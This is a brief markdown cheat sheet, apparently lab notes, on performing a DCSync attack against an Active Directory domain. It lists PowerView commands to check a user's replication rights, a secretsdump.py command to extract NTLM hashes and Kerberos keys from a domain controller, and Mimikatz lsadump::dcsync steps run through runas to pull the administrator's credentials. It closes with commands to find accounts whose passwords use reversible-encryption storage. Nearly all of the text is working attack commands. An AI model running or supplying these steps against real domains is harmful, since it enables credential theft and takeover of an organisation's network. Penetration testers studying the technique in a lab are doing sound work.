# First check if the user has the necessary rights

## Get SID
```powershell
Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```

## Using Get-ObjectAcl to Check user's Replication Rights

```powershell
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

## Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

## Mimikatz

Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize runas.exe to accomplish this:
```powershell
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

### Performing the Attack with Mimikatz

```powershell
.\mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```


# Attacking users with Reversible Encryption Password Storage Set
When this option is set on a user account, it does not mean that the passwords are stored in cleartext. Instead, they are stored using RC4 encryption. The trick here is that the key needed to decrypt them is stored in the registry (the Syskey) and can be extracted by a Domain Admin or equivalent


## Enum
```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```